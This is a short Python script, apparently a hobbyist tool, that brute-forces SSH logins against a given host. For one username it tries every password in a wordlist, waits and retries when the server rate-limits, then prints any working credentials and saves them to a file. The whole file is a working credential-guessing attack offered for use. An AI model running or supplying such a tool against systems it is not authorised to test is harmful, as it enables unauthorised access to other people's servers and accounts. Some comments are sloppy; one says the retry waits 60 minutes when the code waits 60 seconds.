#!/usr/bin/env python3

"""_                        __ _            ___                _____  
 / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
                                           \_\                    /_/ 
"""

#for ssh client interface(paramiko)
import paramiko
import socket
import time
from colorama import init, Fore

   
'''a function that returns the computer name, username, and password
'''

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{Fore.RED}[!] Host: {hostname} is unreachable, timed out.{Fore.RESET}")
        return False
    except paramiko.AuthenticationException:
        #If Authentication Fails(except paramiko.AuthenticationException:)
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{Fore.BLUE}[*] Quota exceeded, retrying with delay...{Fore.RESET}")
        # sleep for a minute
        time.sleep(60)
        '''Calling  [is_ssh_open(hostname, username, password)]
        after 60 minutes'''
        return is_ssh_open(hostname, username, password)
        #---------------------------  if if different  -----------------------------------
    else:
        #connection was established successfully
        print(f"{Fore.GREEN}[+] informations:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Fore.RESET}")
        return True
"""we try to connect to the SSH server and authenticate to it using client.connect() method with 3 seconds of a timeout"""


if __name__ == "__main__":
    import argparse
    """socket.timeout : when the host is unreachable during the 3 seconds.
    paramiko.AuthenticationException : when the username and password combination is incorrect.
    paramiko.SSHException : We will wait 1 minute when the server suspects."""
    parser = argparse.ArgumentParser() #argümanlar için komut dosyası işlevi
    parser.add_argument("host" , help="Enter Hostname or IP Address of SSH Server for Bruteforce please !")
    parser.add_argument("-P", "--passlist", help="Specify word list for passwords.")
    parser.add_argument("-u", "--user", help="target username for ssh service.")
    
    #inmputs 
    host = parser.parse_args().host
    passlist = parser.parse_args().passlist
    user = parser.parse_args().user
    #to read the file containing the password combinations
    passlist = open(passlist).read().splitlines()

    #for exploit ::
    for password in passlist:
        #character assignment from passlist to password in each for loop
        if is_ssh_open(host, user, password):
            #save to file if successful
            open("ssh_informations.txt", "w").write(f"{user}@{host}:{password}")
            break